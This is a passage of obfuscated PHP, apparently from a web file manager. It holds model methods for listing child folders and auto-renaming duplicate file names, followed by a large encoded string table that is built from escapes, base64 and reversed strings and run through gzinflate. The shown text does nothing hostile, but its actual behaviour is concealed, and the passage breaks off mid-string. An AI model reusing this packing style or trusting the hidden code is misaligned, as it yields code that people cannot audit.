$­ä÷–¢°, $Àİö™·Ø[525] => 0))->find(); return is_array($±§ó½Á©) ? $±§ó½Á©[$Àİö™·Ø[202]] : !1; } public function childList($çŒ³í) { $•çÏ„ =& $_SERVER[ŒÅŸ‹ä†]; $î‰´²è¡ = $•çÏ„[2428] . $çŒ³í; if (isset(self::$cacheChildList[$î‰´²è¡])) { return self::$cacheChildList[$î‰´²è¡]; } $¤§ß„éä = array($•çÏ„[201] => intval($çŒ³í), $•çÏ„[525] => 0); $ìŠ½óºÄ = $this->where($¤§ß„éä)->select(); $ìŠ½óºÄ = $ìŠ½óºÄ ? $ìŠ½óºÄ : array(); self::$cacheChildList[$î‰´²è¡] = $ìŠ½óºÄ; foreach ($ìŠ½óºÄ as $‹ÊíÒ) { $î‰´²è¡ = $•çÏ„[552] . $‹ÊíÒ[$•çÏ„[202]]; self::$cacheSourceInfo[$î‰´²è¡] = $‹ÊíÒ; } return $ìŠ½óºÄ; } public function fileNameAuto($ĞÀ´šíˆ, $À‹¦áéÕ, $ä‡ƒ˜¢ï = REPEAT_RENAME, $¶î­œ¤ì = false) { $Õ‡ÎÃ¬… =& $_SERVER[ŒÅŸ‹ä†]; $Ûá”æÜ = get_path_ext($À‹¦áéÕ); $Ì¼°ÕŞ« = $Ûá”æÜ ? get_path_ext_name($À‹¦áéÕ) . $Õ‡ÎÃ¬…[2457] . $Ûá”æÜ : $À‹¦áéÕ . $Õ‡ÎÃ¬…[480]; $áŞ¯³À = array($Õ‡ÎÃ¬…[201] => $ĞÀ´šíˆ, $Õ‡ÎÃ¬…[525] => 0, $Õ‡ÎÃ¬…[42] => array($Õ‡ÎÃ¬…[479], $Ì¼°ÕŞ«)); $èÔµ×« = $this->field($Õ‡ÎÃ¬…[42])->where($áŞ¯³À)->select(); $šß»±³ = array_to_keyvalue($èÔµ×«, $Õ‡ÎÃ¬…[12], $Õ‡ÎÃ¬…[42]); return $this->fileNameAutoGet($šß»±³, $À‹¦áéÕ, $ä‡ƒ˜¢ï, $¶î­œ¤ì); } public function fileNameAutoGet($¤íîÈÌ·, $´‘·„ƒñ, $Æ§•ü©, $¥Ï³’Ô) { $ÚÁ”‹Ï” =& $_SERVER[ŒÅŸ‹ä†]; if ($Æ§•ü© == REPEAT_REPLACE || !$¤íîÈÌ· || !in_array_not_case($´‘·„ƒñ, $¤íîÈÌ·) || $¥Ï³’Ô && $Æ§•ü© != REPEAT_RENAME_FOLDER) { return $´‘·„ƒñ; } if ($Æ§•ü© == REPEAT_SKIP) { return !1; } $¿şÖó = $ÚÁ”‹Ï”[10] . get_path_ext($´‘·„ƒñ); $¿şÖó = $¿şÖó == $ÚÁ”‹Ï”[10] || $¥Ï³’Ô ? $ÚÁ”‹Ï”[12] : $¿şÖó; for ($ƒá•Äï£ = 1; $ƒá•Äï£ <= count($¤íîÈÌ·) + 1; $ƒá•Äï£++) { $ªÓèË™… = substr($´‘·„ƒñ, 0, strlen($´‘·„ƒñ) - strlen($¿şÖó)); $¬”Ù¹˜ = $ªÓèË™… . "\x28{$ƒá•Äï£}\x29{$¿şÖó}"; if (!in_array_not_case($¬”Ù¹˜, $¤íîÈÌ·)) { return $¬”Ù¹˜; } } } } goto dô™Çã¢; DÖ‹¤ö÷ƒá: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\214\305\237\213\344\206", "\365\370\302\327\273\203"); $_SERVER[ŒÅŸ‹ä†] = explode("\x7c\x3\x7c\x1\x7c\x6", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x79\x7c\x1b\xd5\xb5\x0\xc\x8f\x42\x9\x65\x2b\x4b\xa1\xf\xa\x13\x43\xb0\x9d\x68\xb1\xb3\xc7\x89\x93\xc8\xb2\x1c\x8b\xc8\x92\x91\xe4\x2c\xd8\x66\x32\x92\xc6\xd6\xc4\x92"."\106\326\214\274\45\141\53\41\354\11\5\102\240\241\205\122\40\154\11\373\26\266\362\132\332\2\245\245\55\120\332\2\175\20\47\241\224\265\100\113\201\366\273\313\271\313\214\144\170\337\357\373\343\13\44".base64_decode('mnvufu+555577jnnvvfF+8+9d93a/dbuu/aA8QvPfuOJv9Bv9Hd/9B/5PvHiA/chf468+KK6ug==')."\xf6\xd9\x7\x4d\x8b\x1e\xbc\xf1\xbe\x3b\xb5\x3b\xb4\x3b\xb5\x4b\x63\x91\x67\x9f\xb\x1f\xf2\xfc\x1d\xa7\x86\x76\xdf\xf8\xec\xe8\xee\x7d\xf7\xd9\xbb\xe7\xc4\x99\x4d\x28\x31\xcd\xdb\x44\x7f\x94\x82\x69\x2b\xfa\x88\x61\xd9"."\26\5\244\315\102\237\321\117\277\215\2\375\365\323\237\256\170\244\244\347\115\133\247\101\37\375\121\241\135\64\240\365\31\71\75\141\214\351\341\202\33\102\303\70\244\366\353\266\212\52\262\365\2\253\266"."\x25\x90\x8\x7\xd5\xce\x40\xb2\x9d\x86\xb5\x62\xd1\x6f\x65\x6\x2c\xbf\x56\x4a\x67\x8d\x21\x3d\x62\xa4\xfc\x29\xa3\xe0\xcf\x68\xb6\xe6\x4b\xb1\x86\x1d\x44\x7f\x66\x42\xd3\xb3\x7a\x7a\x40\xd5\x52\x66\xc9\xd6\x33\x14\x54".base64_decode('LuSMwoDcEvptDeYM1g81Gkuqia7OzlA8CZ1pkuPzZga+ilpJy0ODi3rJQqMmF6cWzaJecEAEAA==')."\67\74\245\131\120\122\153\213\332\32\352\214\304\126\252\311\225\235\41\110\221\122\7\313\172\151\224\206\310\147\302\326\112\166\322\310\353\74\305\160\211\267\253\45\264\44\34\125\222\361\100\64\21\10\46"."\xc3\xb1\x28\x5\x7\x63\x1d\x1d\xe1\x64\x25\x3c\x1e\x8b\x44\x5a\x2\xc1\xa5\x95\x31\x9d\xf1\xc0\x92\x8e\x80\x82\xda\x87\xa6\xc6\x28\xf4\x99\x75\xca\x2a\x1a\xb3\x4a\xa9\xa7\x1f\x6d\x86\x9e\x83\x21\x2d\x68\xac\x39\xf6\x68"."\x11\xbe\x92\xfc\xb\xa1\x53\xa1\x9c\xcb\xd1\x40\x94\x7f\x65\xf4\x3e\xad\x9c\x83\xd1\x6a\x95\x3\xc5\x92\x91\xd7\x58\xa7\x97\xea\xa3\x1c\xa\x78\x50\xb6\x4d\xa3\x90\xa6\x81\xd0\x88\x5d\xd2\x4\x1c\xb5\x35\x8d\x10\x12\x21"."\21\205\45\102\221\120\60\251\340\6\52\155\361\130\207\2\223\220\327\54\133\57\51\313\333\103\361\220\202\33\335\134\113\372\132\253\0\136\107\321\120\50\201\110\104\231\250\4\133\317\27\131\61\64\117"."\225\302\142\361\326\120\134\151\131\251\210\21\112\233\371\274\131\360\241\122\320\114\332\122\123\103\361\70\375\360\300\62\214\204\361\244\101\40\326\326\226\10\361\20\164\356\264\10\152\311\14\300\117\107\50".base64_decode('05ez1SEtV2ZoCghfCz/wa1qAuoNGwSgDmkIRpsmXP3yUWWqdQfQMfORRfhPypQCWYqlWsw8DLQ==').strrev('eÈÉ„œ¼å¢HAËo°Ë™†H	}„µ¶vj>o@'."\n".'1™´…ê­’ô‡ø¼)ü‡Îş¼Ùú!ğ')."\112\154\351\175\131\112\32\214\360\225\214\323\212\120\21\265\204\23\1\243\157\124\54\105\234\256\223\307\132\146\271\224\106\44\257\17\206\245\21\300\272\155\243\316\261\1\61\273\212\71\123\313\44\364\22"."\357\232\141\266\241\202\142\145\133\6\16\260\125\220\221\6\301\137\327\175\216\367\337\275\335\213\321\77\365\100\220\173\240\232\254\236\313\251\372\210\16\313\44\237\231\145\261\376\371\55\114\65\21\204\6"."\xc3\x31\x35\xab\x59\xd9\x8e\xcc\x2c\x95\xe4\x62\x74\x3e\xa3\x8f\xf8\x8a\xd9\x22\xac\x61\xbe\x6c\x7b\x1c\x68\x8c\x47\x23\x6a\xda\x21\x69\xb7\xc8\x99\x69\xd\xd2\x96\x49\xe7\xe8\x77\xd6\xb6\x8b\x9\xbd\x90\x69\xe3\x4\x37".base64_decode('Yw4XSOeLOqPNrR4lo3QoK5X2JqPJYhnzOf7FesdhFgfaI2yGMn2AgGxPqIEKDYvQM7EY0ZaSMw==').strrev('_3Yu‚k¹1yeºV*e&…ôd¬oaÌåÈÎfJ•Ú ŞYn´éƒ]%ÙkÛu¶™¿˜mšÒ').base64_decode('wbiAq5naXLb7vHPZeuOpS1rB6tNL3hAge5OCGstpHkvWalhF0zJw85oUzba1dBbTC1F885ekNw==')."\xf0\x3e\xa7\x57\xa6\x45\x85\xe8\xde\xce\x92\xd6\x9f\xd7\x9a\x94\x62\x39\x85\x6\x0\xd6\x18\xc0\xd2\x38\x85\x9c\x18\x6\xa0\x49\xc9\x6b\x23\x5e\xad\x9f\x95\x14\x1a\x29\x1a\x25\xdd\x62\xbd\x56\x96\x74\x24\x1\xa3\xfa\xbc"."\35\170\155\30\172\306\233\100\4\31\12\233\321\60\123\101\270\242\260\70\12\155\117\46\73\325\160\33\332\161\243\41\265\43\220\14\302\156\37\262\265\176\126\164\4\221\131\136\44\3\256\360\242\65\202"."\261\51\212\72\47\200\235\346\260\136\102\25\267\214\66\51\3\146\46\145\216\370\130\124\33\160\35\54\61\236\337\242\355\215\153\205\176\334\215\324\250\255\133\156\162\323\202\366\147\137\37\135\220\276\224".base64_decode('3meWGLsw1O8c/Ihe6LezrOxEKL4sFFcTsbbk8kActvMCwpwR1hpce84b1zNoENM2y6cVxeiv8A==')."\342\5\203\53\147\261\170\21\261\270\110\170\11\36\273\126\257\205\22\171\345\124\254\354\210\221\67\160\367\154\36\103\6\33\355\365\113\240\101\176\322\347\346\36\153\152\135\117\146\132\275\27\375\73\265"."\xbe\xbb\xa7\xd5\x37\xb5\x77\x91\xdf\x10\x79\xfc\x8d\xbe\x46\x65\x7a\xc3\x6c\xa5\x13\x31\x1f\x86\x96\x53\xa0\xd3\x15\x29\x1a\x94\xd8\x52\xe7\xb0\x8\xc\x2f\x98\x5\xbd\xea\xc2\x42\x88\x64\x5a\xba\xb7\x5d\xd7\x10\xdd\x45"."\x13\xe1\x98\x17\xf\xab\x8b\x86\xbf\x64\x74\xf1\xf6\x27\xd1\x12\xd7\xbc\x50\x60\x3c\x74\x5a\x57\x28\x91\x54\x3b\x42\xc9\xf6\x58\x2b\x34\x3f\x14\x80\xaf\x2\xca\x4c\xda\xcb\xe6\x18\xf3\x5a\xb0\xd3\x15\xa0\x58\x7d\x44\xda".base64_decode('FgR5T8sDQvJFzWFG0F0IFMRM6QRx6At6Y1K6xKaum/70Ajb30h9VDUZCgbgKTKpqWG3SzoiDnA==')."\xdc\xaa\x66\x6a\x35\x42\xb4\xe\xdd\xd6\x44\x7\x50\x75\xe1\x3c\x5a\xd2\xa2\x23\xaa\x73\x1b\x63\xbd\xec\x10\x88\x8f\x56\xd0\x72\x23\xc3\xf7\x39\x14\x6c\xd7\x8d\xfe\x2c\xb4\xdb\xc0\xc5\xa5\xcd\x9c\x59\xd2\x72\x78\x2b\x60"."\xac\x69\xbf\x1\x54\xb9\x98\x2b\xa3\x65\xe0\xc7\x5\x27\xb3\xe5\x7c\xa\x36\x2e\x34\x64\xe8\x8\x20\xb8\x46\x6b\x14\xb1\x56\x79\xb6\xe7\xa2\x8d\xdb\xe\xb7\x3a\x76\x56\x8\xf9\x55\x8c\xba\x3d\xbe\x62\xa1\xbf\xfe\x64\x28"."\x4b\x9d\x3e\xab\x1\x3\x60\x56\xa1\x67\x88\x7d\x2e\xeb\x95\x5d\xf7\xa5\x4d\xb4\xce\x3b\xb4\x1\xbd\x9\xf7\x5\x88\xdb\x7c\x2\x65\x1\x89\x7e\xce\xc7\x5b\x5e\xb3\x9b\x4c\xe0\xd9\xca\xf9\xf2\xa8\x10\x52\x66\xd0\xe4\x9b"."\64\75\110\315\167\156\171\212\136\52\231\245\311\220\202\174\53\144\337\304\323\5\205\333\234\261\260\20\105\140\337\131\223\63\42\46\303\315\46\77\364\173\312\364\66\240\42\31\304\220\371\54\33\115\2".base64_decode('6qCWyVQDI8oDBaxlaEsiGFvgT8xA/wseIGPmNbajYkLEq8UBi4fINqln6D7pANEFTkFTWZUl2w==')."\xc4\x91\x25\x47\x4a\x84\xa4\x59\x13\x1a\x8d\xb0\x2\x3a\x5c\xe6\x3d\x67\x63\x90\xd1\x73\x3a\x43\xb0\xac\xce\x58\x8d\x6\x48\x86\x66\x86\xa3\x9f\x38\xe7\xa1\xf3\x1\x82\xa\xb6\xcd\xb0\xe2\x28\x27\x66\xc\x58\x78\x39\x3e"."\x50\x9\x0\xe6\x8e\x0\xaf\xc4\x67\xe\xcd\x6a\x8c\x2c\x28\x11\xee\x2c\xe9\x7d\xc6\x8\x23\x25\x23\x76\x87\x56\x1a\x60\x1d\x43\x39\xc5\x52\xc4\x1\x69\x99\xb6\x75\x45\x22\x6a\x30\x16\x4d\xa2\xf3\x18\x85\x2c\x8f\x87\x93".base64_decode('IUaxAq1qINgJIUEDOQMnsyAUMjQdUAg1wi94JbRZF80CorRArLzitFYRlRGsBOCOYD9cHAXiCQ==')."\xf2\x63\xde\x3c\xa2\x2b\x5e\xde\xa6\xce\x2e\xe0\x5\x18\x56\x30\x4e\xb7\x65\xb4\xcd\x2c\x31\x36\xce\xe8\x2f\x2c\xe3\x33\xbf\x3c\x31\xd3\xdb\xde\x11\x8\x7a\x13\xed\x81\xe9\xb3\x66\x53\xe8\xca\x7c\xa6\x27\xd9\x6e\x58\x3d"."\247\363\60\64\147\330\232\251\226\164\264\246\31\56\114\157\150\144\53\16\361\45\232\150\371\112\157\336\213\113\301\54\245\257\241\241\201\225\65\155\266\222\105\244\204\323\357\14\351\55\73\274\224\323\3".base64_decode('ukzOLe+wwWjeyZwdP7ly8K0y2d1ULY2LU1Fmu2zJI4UQMIOyGIxLplAt128ivMvmZWCG4y8N6w==')."\x94\xe5\x82\x8a\xb2\x1a\x1f\x27\x3c\x7a\x6c\x71\x20\x86\x6e\x54\xce\x84\x87\x19\xb5\x81\xd1\x6f\x27\x8f\xad\x24\xab\xf\x34\x65\xdd\xc3\x30\xda\xa2\x1d\x45\xbc\xb3\x21\xaa\xcd\xa6\xed\x14\xa8\xbf\x8c\x16\x6c\xc9\x18\x93"."\206\175\21\53\202\21\313\130\2\352\32\311\347\304\171\12\306\4\206\121\356\323\210\212\142\230\114\110\225\143\332\71\1\140\303\337\321\352\132\14\164\327\247\260\5\213\120\215\312\20\226\316\230\205\346".base64_decode('2kZfQ63CTpnNtV3JNsSgL1p40IKgmS9ietJRztkG7ihF2YUgUlqAmR8W6HSNQyipwXazwC+nWw==').base64_decode('4J+oVOgK5shWqJ2RQLItFu8A5C4WBT4V09WWmVeQorLl1TGDDOivpXMu3JTHYkVVFFxRDQVXuA==')."\120\160\105\45\12\256\250\206\140\103\200\211\132\136\33\63\13\150\241\242\35\66\357\113\3\132\44\333\303\321\245\152\107\254\65\24\121\303\121\304\310\45\53\341\135\235\255\1\106\377\144\170\113\214\311".strrev('eÏI& ¢il0jZEØ<ámCÆv¢ÚÓÈWX!Fª&Hœ"´<ØHe¹X…Ú')."\54\277\63\275\212\170\322\4\27\241\251\200\160\20\162\110\255\124\46\217\121\5\11\106\347\33\35\246\3\272\213\205\220\244\47\52\243\121\145\316\141\262\303\174\236\355\261\350\154\6\303\316\16\46\165"."\xf4\xa7\x5e\x9\x24\x14\xbb\xa8\xf2\xdd\x34\x35\xca\x3f\x49\x37\x58\x58\x65\x5c\x24\xe2\x43\xa0\x21\xa\x30\xca\x15\x4d\x51\x71\x9a\x16\xe9\x38\x54\x1d\x10\xe8\xb3\x39\x2f\xea\xa\xa3\x4d\x44\xc4\xa1\xa9\x8\x10\xb1\x27".strrev('bXÆ†r×gbÚ[Sçc¨y†Î¬á†@—E]RÀ°ŠÖ5G"éÍ`’¤¶P52	B')."\xf4\x57\x9b\x6c\x4c\xd1\x99\x9c\x71\xfd\x5\x36\xe0\x29\xcc\xd6\x30\x5e\x97\x7d\xf4\xa1\x15\xcd\x58\x12\xb3\xcc\xcb\x4f\x99\x26\x94\x99\xc3\x47\x31\x28\xde\x62\x38\x31\xc2\x36\xe6\x69\x7c\xe3\x2\x4c\x8d\x2d\xd\x45\x55"."\x86\x48\x34\x24\x21\x1f\x5\x84\xe2\xf1\x58\x1c\xba\x6d\x9b\x3\x4c\xb2\x45\x23\xe3\xa1\x44\x28\xc9\xb6\xf6\xc1\xb2\xc1\x6\xc5\xef\x9b\x6\x48\xab\x23\x66\xe\xaa\xf7\x9f\xd1\x33\x3c\xad\xae\xdb\x3b\xcd\xd7\x8b\x3e\xea".base64_decode('py6mQQj1+BxBxmOXSzw35v/qrEX1TT3+Hn/doqbugHdM8441eOd5exFnXj8NAL1rpntmrsMJUA==')."\302\105\47\365\242\237\346\236\105\123\172\274\247\234\271\152\161\167\117\157\155\323\264\311\75\276\223\172\206\173\247\326\57\142\365\244\313\45\304\374\263\35\15\65\65\63\255\16\65\11\235\126\171\222\202"."\x44\x87\x49\x2\x16\x31\x66\x14\x5\x74\xcd\xec\x75\xc\x8e\xe6\x4d\xef\x17\x39\xba\xbd\x3d\xd3\x7a\x17\x49\xf9\x24\x90\xbb\x2e\x44\x4a\x11\xab\x97\xe5\xe9\x2\xde\xd3\x71\xcf\x78\x56\xbc\xcc\x1\x27\xca\x85\xb4\xd8\xd"."\61\366\247\64\176\354\353\57\210\363\224\135\342\322\316\41\204\221\202\340\256\231\102\177\327\261\211\354\327\107\30\45\50\364\31\214\215\52\27\214\101\166\260\51\350\203\360\141\332\34\213\165\173\130\147"."\xe8\x81\xe0\x8e\x30\x42\xe\xb6\x9\xa0\x28\x29\x94\x93\x36\xd\x22\xc3\xe2\x38\xca\x91\xc9\x28\xaa\xf8\x8c\x37\xcc\x43\x68\x4f\x81\x79\x9a\x4\xa9\xad\xb4\x56\xd4\x13\x52\xf\x55\x35\x19\x68\x89\x84\xf8\x81\x15\x8\x2f".base64_decode('CxMi2MLvRFDXBAFlVECSTxF5EaxvazCnkOVPD1dN5BrLKhfxOUlBM47GVkF8m9K8UKFDDvlUeQ==')."\x2\x8a\xfc\xfc\x83\x5\x9c\xba\x58\xe8\x98\xe\x41\x9b\x8a\x62\x86\x2c\x74\xfe\x60\x27\x0\x7f\x5d\x4f\x4f\xb9\x5b\xcf\xf4\x76\x23\xc4\xd7\xbc\x7d\xbd\x6b\x66\xac\xab\x67\x42\x14\x7f\xf\xfa\xc3\x2\x81\x2a\x17\x15\xaa"."\146\263\41\341\324\117\135\22\112\372\160\213\270\150\332\21\340\321\64\150\226\370\201\242\350\70\321\333\246\255\345\34\105\44\61\204\21\46\306\112\201\104\227\316\173\104\320\53\314\161\110\167\75\204\174".base64_decode('RrkElXPC0mUDzpHQbR9P4ZEiVRSWiTW/3yGhZSIhyQPUWUF/lreHooyUJ6XvZiUYSIRYCNiugw==').strrev('i²¡y‘Ü*V4'."\0".'Ær€‹›9s•¶;_,¥.8>ùâ¥_iAÌZ”6ÄæÉ'."\n".'ÿ¡G¸VÑB')."\325\262\242\363\17\223\210\116\5\301\164\315\324\152\11\303\205\202\231\111\311\210\56\166\364\45\1\304\73\45\225\72\166\237\243\204\243\112\113\54\26\11\5\242\12\146\36\140\257\103\234\111\42\324\31"."\x40\x1b\x25\x96\xad\x26\x92\x21\xb8\x62\x32\x60\x32\xc3\xad\x5e\x56\xfe\xa\x2f\x93\xa8\xf0\xf\xb3\x48\x4f\x30\xba\xad\xe6\x4c\x46\xba\x9c\xb2\x18\x7c\xc\xf4\x60\x89\x88\x7\x33\x32\x1e\xd4\x6a\xf\x16\xa2\x78\xc4\x21".strrev('=Xy9é¢\'6‡¨Úsº‹v	¬Q *O|ä­XcÕ¸gÀÿbçØø>L>†C<I®#Û').base64_decode('TBzmIWKsVmhWF1rM0CzyiWh21oORFq8Zj7i48ZjDBb1EksCwCdGAR4gNPP0ls1zsZHVKIdosAA==')."\x88\x36\x73\x40\xdc\x34\x6d\xf\x93\xb0\x79\x64\x51\x1b\xb4\x22\xc0\xd6\x66\xd5\xe1\xac\xde\x1b\x32\xfe\xee\x46\x0\x7e\xe1\xa8\xca\x51\xfa\x8a\xc9\xaa\x9c\xf\xa7\x94\x71\xd\x2d\x11\x24\xac\xeb\xd8\x1e\xeb\x48\x43\xa4"."\175\234\325\305\3\56\276\244\65\217\73\320\246\301\25\41\55\126\376\146\130\307\166\66\206\306\342\102\107\334\316\11\306\332\55\360\161\337\333\341\112\321\351\55\41\125\147\153\375\254\56\114\40\371\331"._kodDe('LTuf60PIDpTEElpbMtWGv0MQAaNum2NuUkrmidYYvZHShDqZyeUjJNdJ21AGD64Yktl1e7Zac5I=')."\x8d\xc5\xc4\x3e\x81\x36\xd1\xb6\x1c\x1b\x86\xe9\x72\x34\x90\x79\x8f\x33\x84\x97\x93\x8f\x90\x70\x72\xf7\x9d\xe0\xc2\xca\x48\xa8\x2d\xa9\x9c\x1a\x43\xf4\xca\x30\x55\x9a\x47\xc5\x89\x15\xf2\x8f\x59\x50\x1c\x65\xb3\xe1\x42"."\124\236\224\310\303\132\41\103\41\253\320\176\262\252\271\206\125\122\343\310\56\20\303\331\10\17\13\52\225\250\206\207\133\36\4\214\0\244\373\142\17\144\240\230\330\162\313\300\151\152\26\34\361\260\250".base64_decode('F750BhNTK2OiRGAEgLXLUS8OilXEUELBFXgk3ggTEa9YD1LQOeQujHRt1HiIOo3CqFFIGFiC4Q==')."\206\302\302\46\115\350\324\54\153\30\61\40\260\357\115\235\72\125\21\254\200\340\104\360\152\27\41\212\264\23\175\323\135\5\113\71\150\365\36\270\244\366\140\355\35\151\307\26\122\125\324\71\242\111\224"."\167\334\160\124\166\14\12\222\222\210\1\202\5\16\13\42\253\225\304\130\63\262\204\151\3\357\203\205\223\210\240\224\254\117\33\22\134\222\43\217\104\134\54\173\224\253\37\111\237\316\102\151\260\325\103"."\x7e\xdb\x51\xe3\x3d\x65\xd4\x4a\x42\x8f\x23\x68\x2c\xd0\xf\x69\x68\xd2\x14\xa4\x9d\x7e\x74\x92\x7d\x19\xad\x6f\x14\x45\xf7\x72\x6b\x2\x42\x80\x27\x6\x8b\xe4\xe4\xcd\x8f\x56\x67\x64\xf8\x8\x44\xb8\xda\x94\x7\x9d\xb8"."\132\341\52\3\177\57\103\164\104\146\31\54\251\341\261\262\70\346\147\215\14\72\42\250\62\336\211\233\46\42\335\250\143\44\14\30\30\125\222\171\160\22\350\144\101\50\1\16\360\55\5\235\120\162\150".strrev('T\\ğ;ej‹< Ñ~è¬P¦.Eòß‰-ˆÅ¼K¢§\'Q!(¼P4t\'µÊÀ”ì6A÷‚]*ğù-').base64_decode('D7eVTM7Ec27CnShIzstcWcXFAUjj4eBaKkBSHjf/4oK6gpinqbLVQTPJBVSJbpY+dPoBnSNPgw==').base64_decode('xNoJCreGXgLC5rrONb+2aaIjdclXQjWKhkjUFWgPUVJJaH26zJA4IgPFomg2L99CWaQdxMmRsQ==')."\62\23\105\215\155\34\212\127\161\225\240\25\213\162\235\234\235\144\10\117\16\134\145\16\120\340\216\227\366\132\164\211\267\225\106\104\70\57\216\211\127\50\143\330\30\202\327\261\311\156\310\104\102\261\275".base64_decode('uzOLsLzfkG2zAm3EQcczxZGyGnPjm0r4EZ/gxapra6XNIjv6lSTNyiFdAuLLyqKIkYI0WooShQ==')."\x4a\xa9\xf8\x54\x90\x16\xa1\x95\x99\x21\x1c\xbc\x18\x5\x92\x16\xf2\x12\xe1\x3\x5d\xfc\x3e\x7c\xe0\xf1\xc9\xbb\x48\xa0\x54\x62\xa8\x4f\xbb\x89\x2f\xd2\x11\x50\x6\x61\xe2\x9c\x60\xeb\xb6\xda\x5e\x4b\xb\xf\xd\x9\xfd"."\104\132\24\256\330\107\11\7\276\255\215\25\370\172\21\337\225\111\145\161\153\365\202\22\102\201\301\31\252\236\74\220\313\265\152\254\255\356\360\204\131\50\301\220\63\311\220\11\263\265\221\263\67\323\326"."\xa8\x6\xe3\xa7\xae\x89\x4f\x12\x6e\xad\x1\x27\x91\x9f\x98\xdf\x9a\x80\x3c\x8a\x69\xac\x1e\x46\xac\x43\x30\x6b\x14\x74\x26\x9f\xea\x33\x4a\x56\x35\x6a\xf7\xff\x33\x63\x5f\x39\xf2\x78\x85\x4c\x84\x2e\x38\x4e\x12\xcc\x63"."\175\356\41\135\76\342\160\271\264\40\125\234\347\250\340\224\200\133\221\2\252\355\140\370\342\244\174\151\71\71\60\4\55\137\72\36\170\263\13\307\174\326\4\70\353\116\307\365\163\10\115\34\341\173\264".base64_decode('nAlH4bmUCxUM5pek54ULZlNOh3AXR0zUVhbNS7n49o8v/9H79Hv99bd88Mw2+j1jFghZ0b9VFA==').strrev('ËÊÊû?ç{¢ë»Şwóşßú²yÛ?ásU†ìëe~\\w&ÛõÀúõ[ø}ÖgÑùû6è¯×ú')."\223\137\244\356\353\330\272\341\250\372\277\376\127\371\205\37\315\72\375\372\375\377\370\207\175\117\77\71\173\356\277\277\377\327\357\235\365\302\53\327\75\373\356\367\342\253\17\174\355\232\31\375\317\157\265".strrev('ùyö[­ıÚŸ;«ü¿Gs·šëz¯µú~oúşo‚7Å#öwíOÉºíÿ¿±àı‡+×ûZ¿Ïv')."\172\342\316\137\234\170\372\205\167\237\376\306\177\36\114\37\274\363\330\215\237\136\160\304\300\334\363\316\213\35\361\363\233\316\11\217\377\327\373\365\247\304\267\36\125\372\103\376\360\154\372\240\33\353\77".base64_decode('eXFz4X5rxTsf3/8/heuOfHflZfv2G8O7XjvyvNprkt/88fOn3vrzRQ/fsu6+U375ufWb294P7A==')."\xf8\xf5\x13\x37\x95\x66\x6e\x7b\xf0\xda\xb5\x8f\xfe\x2e\x9b\xbf\xfa\xbf\x4f\xdf\xba\x6b\xcd\xa6\x1f\xc7\xbc\x73\x3b\xd2\x57\x9f\xfe\x87\xf\x8e\x58\x16\x58\xf3\x86\x6e\x3d\x72\xcd\xaf\xfb\xbe\xd1\x78\xe6\x79\xd7\x98\x63"."\x8f\x6f\xf\xfe\xfa\xc8\x85\xc7\xbf\x10\x78\x69\x9f\xb1\x9b\x37\xfd\xea\xe9\xc7\xae\xdd\xfd\xc3\xf3\xc7\x5f\xb8\x76\xfd\x95\xf\x6f\xda\x3a\xf7\xe1\x96\x9b\x1f\xba\xf5\xed\x96\xc2\x4d\x97\x3e\x79\xfc\x11\xef\x7e\x32\xf3".base64_decode('90tGYhcsnHfcweUjr/303MJBx+05Yf3QtN9fnXh002+/NvuSX0/7ze8+/fM5v6nbeP1CXzp41w==').strrev('ÎçW¢úapş÷ërb·Uáğ?÷³ñïlƒë|×‰ái®:ßIÄ÷¶9o7ïòzŸë¢«ŞtÿŞ')._kodDe('Km9yaSDa7tIHUfDe4wqHCsqlc9jpA0vw6XvyTy9PAnvps8ElL7BUXa7D5j3TQjli7i3xgWuwq2k=')."\xd9\x37\x95\xbb\x36\x1e\xb6\x6a\xd2\xe4\x5\xef\xdc\x7b\xff\x1f\x9e\x5e\x78\xec\xf9\x19\x63\xd6\x77\xde\x39\xfd\xfc\xc9\xf\x36\x15\xc7\x7e\xb1\xfd\xa1\xf3\x2f\x9f\xec\x5f\xba\xe9\xd4\xed\xc7\xfd\x64\x7e\xdf\xce\x7d\xeb"."\356\320\122\373\335\360\350\71\267\34\372\324\223\43\271\207\365\114\240\377\232\77\337\225\133\32\237\164\354\262\237\76\63\175\375\7\276\43\323\73\77\235\65\174\303\302\227\117\373\363\347\163\37\276\104"."\121\176\353\35\171\246\363\300\343\66\317\210\306\17\275\344\322\55\173\316\375\170\313\305\107\165\334\172\143\135\376\234\153\66\355\134\275\323\76\363\272\55\327\51\363\172\37\354\234\165\345\211\163\213\133"."\x36\x4e\xdb\xfc\xf5\x3\x8e\x38\x67\xf2\x9a\x67\x6f\x99\x3c\x7c\x58\xd3\xd3\xb3\x32\x7d\xb7\x94\xaf\x7d\x72\xdd\x3e\x17\x1f\xd8\xbc\xf5\x69\xdf\xc1\xfe\xe7\xf\x3b\xea\xf1\xe6\xbf\x1d\xf9\x9d\x4f\xae\x8f\x2a\xbd\x37\x7f"."\xa4\x1c\xb2\xcf\x5d\x8f\xfe\xa6\xf3\x82\xf1\x96\xa5\xc1\x3\x66\x75\xf7\x7e\xfa\x5f\x8d\x6f\x1c\x3a\x78\x6c\xe4\xd9\x93\xbe\xf1\xed\x6f\x5c\xff\xf8\x65\xaf\x59\xe7\x1c\x9a\x3e\xe6\x89\xc5\xb9\x27\x13\x17\xd4\x2c\xf8\xc7"."\xd9\x93\xfe\xe7\x67\xb7\x1d\xf9\x70\xfc\xe7\x97\x19\x87\xac\x4f\x6d\x8a\x3f\xfb\xed\x4f\x5a\x37\x37\x9c\xb3\xf1\x88\xa9\x7f\xbf\xbb\xfd\x82\xb\xbd\x3f\xf0\x4c\x59\x76\xec\xbe\xeb\x16\x6c\xbe\xfe\xe2\xf6\xcb\x7e\xb4\x7e"."\xf0\xb9\xd\xda\x33\x9e\x9f\xdb\x4f\x1e\xbc\xfd\xd5\x15\xcf\xf9\x9f\xf\x14\x1f\x7c\xe7\x9b\x43\x7f\xf9\xd8\xda\xf8\xed\x5b\x7f\x76\xd5\xe6\x15\xbb\xee\x6b\xfc\xd6\x77\x95\x7\x7f\xfe\xe2\xc1\x57\xc\x5d\x72\xf8\x29\x1f".base64_decode('3fWHbZeWT1v6wNLHxlYOXP2vnS1HnXzC39tfnNfx3Enbrjrio96/XLr5wG9u2hJY2xBf+2